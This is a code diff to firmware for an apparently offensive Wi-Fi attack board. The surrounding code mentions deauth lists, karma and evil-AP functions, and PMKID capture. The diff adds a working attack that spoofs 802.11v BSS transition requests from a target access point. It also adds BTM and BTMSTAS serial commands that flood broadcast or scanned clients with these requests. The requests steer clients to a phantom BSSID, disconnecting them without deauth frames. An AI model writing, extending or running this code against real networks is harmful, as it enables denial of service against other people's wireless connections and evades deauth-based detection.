@@ -1015,6 +1015,48 @@ static void csa_send_frame(const uint8_t* bssid, uint8_t newch, uint8_t count, u
   wifi_tx_raw_frame(tx_stage, n);
 }
 
+// --- B3: 802.11v BSS transition management (BTM) request -------------------------------
+// A WNM action frame (category 0x0A, action 0x07) - what an AP legitimately sends to steer a
+// client to another BSS (band steering / load balancing). Spoofed from the target AP it asks a
+// client that supports 802.11v to move to a candidate on <newch>, and the candidate is a
+// locally-administered phantom BSSID, so the client roams off and finds nothing. No deauth
+// frame is involved anywhere: same class of effect as CSA, with CSA's same limit - a client
+// that requires protected management frames (PMF/WPA3) ignores it - and the board must already
+// be tuned to the AP's channel (the caller does that).
+// Layout: action header, dialog token, request mode 0x05 (preferred candidate list +
+// disassociation imminent), disassociation timer, validity interval, neighbor report element.
+static void btm_send_frame(const uint8_t* bssid, uint8_t newch, const uint8_t* dst) {
+  uint8_t f[80];
+  int n = 0;
+  f[n++] = 0xD0; f[n++] = 0x00;              // frame control: action
+  f[n++] = 0x00; f[n++] = 0x00;              // duration
+  memcpy(f + n, dst, 6); n += 6;             // addr1: the client (or broadcast)
+  memcpy(f + n, bssid, 6); n += 6;           // addr2: source, spoofed as the AP
+  memcpy(f + n, bssid, 6); n += 6;           // addr3: BSSID
+  f[n++] = 0x00; f[n++] = 0x00;              // sequence (driver fills it)
+  f[n++] = 0x0A;                             // category: wireless network management
+  f[n++] = 0x07;                             // action: BSS transition management request
+  f[n++] = 0x01;                             // dialog token
+  f[n++] = 0x05;                             // request mode: candidate list + disassoc imminent
+  f[n++] = 0x00; f[n++] = 0x01;              // disassociation timer (LE, 100 TU)
+  f[n++] = 0x00;                             // validity interval (beacon intervals)
+  f[n++] = 0x34;                             // element: neighbor report (52)
+  f[n++] = 0x0D;                             // element length: 13
+  f[n++] = (uint8_t)(bssid[0] | 0x02);       // candidate BSSID: locally administered phantom
+  f[n++] = bssid[1];                         //  built from the AP's own MAC, so the "sibling"
+  f[n++] = bssid[2];                         //  looks plausible but does not exist
+  f[n++] = bssid[3];
+  f[n++] = bssid[4];
+  f[n++] = (uint8_t)(bssid[5] ^ 0x01);
+  f[n++] = 0x07; f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00;  // BSSID info: reachable + secured
+  f[n++] = (newch > 14) ? 0x79 : 0x51;       // regulatory class (FCC 2.4 / 5 GHz)
+  f[n++] = newch;                            // channel number
+  f[n++] = 0x07;                             // PHY type: HT
+  memset(tx_stage, 0, n);
+  memcpy(tx_stage, f, n);
+  wifi_tx_raw_frame(tx_stage, n);
+}
+
 static void karma_respond(const char* ssid, const uint8_t* client, int chan) {
   uint8_t bssid[6];
   uint32_t h = 2166136261u;               // FNV-1a -> stable BSSID per SSID
@@ -1244,7 +1286,7 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
 // caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
 // We advertise "DSEBH" (no BLE -> no L/I/C/K).
 #define DELFY_FW_VERSION "1.0.0"
-#define DELFY_FW_CAPS    "DSEBHLICKR"
+#define DELFY_FW_CAPS "DSEBHLICKRT"
 
 // --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
 #define DAUTH_MAX 8
@@ -2099,6 +2141,74 @@ void loop() {
       for(int i=0;i<cnt;i++) tx_beacon_raw(src, TX_BCAST, ssid.c_str(), (uint8_t)ftype, chan);
       String r = "TXBEACON:" + String(ftype, HEX) + ":" + String((unsigned)cnt);
       Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,7)=="BTMSTAS"){
+      // B3b: unicast BTM request to every station from the last STASCAN. Same argument as
+      // CSASTAS: a real AP steers clients with unicast management action frames, broadcast ones
+      // are widely ignored.
+      // Args: BTMSTAS <bssid-12hex> <ap-chan> <new-chan> [frames]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
+      int newch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 1;
+      uint8_t bssid[6];
+      bool ok = (hex.length() == 12);
+      for(int i = 0; ok && i < 6; i++) {
+        int hi = hexnib(hex.charAt(i * 2));
+        int lo = hexnib(hex.charAt(i * 2 + 1));
+        if(hi < 0 || lo < 0) { ok = false; break; }
+        bssid[i] = (uint8_t)((hi << 4) | lo);
+      }
+      if(!ok) {
+        Serial.println("ERROR: BTMSTAS needs a 12-hex bssid"); Serial1.println("ERROR: BTMSTAS needs a 12-hex bssid");
+      }else if(sta_n == 0) {
+        Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
+      }else{
+        if(apch < 1 || apch > 165) apch = 6;
+        if(newch < 1 || newch > 165) newch = 1;
+        if(apActive) destroyAP();
+        wext_set_channel(WLAN0_NAME, apch);
+        uint8_t sent = 0;
+        for(uint8_t i = 0; i < sta_n && i < STA_MAX; i++) {
+          for(int x = 0; x < 3; x++) btm_send_frame(bssid, (uint8_t)newch, sta_list[i].mac);
+          sent++;
+        }
+        String r = String("BTMSTAS:") + String((unsigned)sent) + " ch=" + String(newch);
+        Serial.println(r); Serial1.println(r);
+      }
+    }else if(readString.substring(0,3)=="BTM" && readString.charAt(3)==' '){
+      // B3: BTM <bssid-12hex> <ap-chan> <new-chan> [frames]
+      // Spoofs BSS transition requests from the target AP; a client that supports 802.11v tries
+      // to move to the phantom candidate and leaves the AP without a single deauth frame.
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
+      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
+      int newch = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 1;
+      int frames = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 12;
+      uint8_t bssid[6];
+      bool ok = (hex.length() == 12);
+      for(int i = 0; ok && i < 6; i++) {
+        int hi = hexnib(hex.charAt(i * 2));
+        int lo = hexnib(hex.charAt(i * 2 + 1));
+        if(hi < 0 || lo < 0) { ok = false; break; }
+        bssid[i] = (uint8_t)((hi << 4) | lo);
+      }
+      if(!ok) {
+        Serial.println("ERROR: BTM needs a 12-hex bssid"); Serial1.println("ERROR: BTM needs a 12-hex bssid");
+      }else{
+        if(apch < 1 || apch > 165) apch = 6;
+        if(newch < 1 || newch > 165) newch = 1;
+        if(frames < 1 || frames > 60) frames = 12;
+        if(apActive) destroyAP();
+        wext_set_channel(WLAN0_NAME, apch);
+        for(int i = 0; i < frames; i++) btm_send_frame(bssid, (uint8_t)newch, TX_BCAST);
+        String r = String("BTM:") + String((unsigned)frames) + " ch=" + String(newch);
+        Serial.println(r); Serial1.println(r);
+      }
     }else if(readString.substring(0,7)=="CSASTAS"){
       // B2b: unicast CSA to every station we know about (from the last STASCAN). That is what a
       // real AP does and what clients actually obey - broadcast CSA action frames are widely
